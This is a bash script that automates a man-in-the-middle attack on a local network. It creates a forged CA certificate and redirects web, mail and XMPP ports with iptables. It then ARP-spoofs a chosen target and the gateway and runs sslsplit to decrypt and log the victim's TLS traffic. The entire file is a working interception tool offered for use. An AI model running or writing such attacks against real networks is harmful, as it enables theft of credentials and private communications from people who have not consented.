#/bin/bash

## You have to create a directory in Documents/tools/ssl_split
## You have to create a file called connections.log in the directory "ssl_split"

read -p "Which internet interface are you using? (wlan0, eth0, wlan1..):  " interface
open_requironments(){
    rm -f /root/Documents/tools/ssl_split/logdir/*
    mkdir -p /root/Documents/tools/ssl_split/logdir
    touch /root/Documents/tools/ssl_split/connections.log
}
open_requironments

create_files(){
    read -p "Do you have a certificate already? Y/n " answer
    if [ $answer == 'n' ]
    then
        echo "Fill in the information for certificate signing.."
        openssl genrsa -out /root/Documents/tools/ssl_split/ca.key 2048
        sleep 5
        openssl req -new -x509 -days 45 -key /root/Documents/tools/ssl_split/ca.key -out ca.crt
        echo "              "
        echo "--------Done creating certificates-----------------"
        fi
}
create_files


re_routing(){
    sysctl -w net.ipv4.ip_forward=1 -q
    iptables -t nat -F
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
    iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
    iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
    iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
    iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
}
re_routing


arpspoofing(){
    read -p "Enter target IP: " ip_target
    gnome-terminal -- arpspoof -i $interface -t $ip_target $(ip route show | grep via| cut -d " " -f 3)
    gnome-terminal -- arpspoof -i $interface -t $(ip route show | grep via| cut -d " " -f 3) $ip_target
}

arpspoofing


ssl_striping(){
    sleep 3
    gnome-terminal -- sslsplit -D -l /root/Documents/tools/ssl_split/connections.log -j /root/Documents/tools/ssl_split -S /root/Documents/tools/ssl_split/logdir/ -k /root/Documents/tools/ssl_split/ca.key -c /root/Documents/tools/ssl_split/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080    
}

ssl_striping
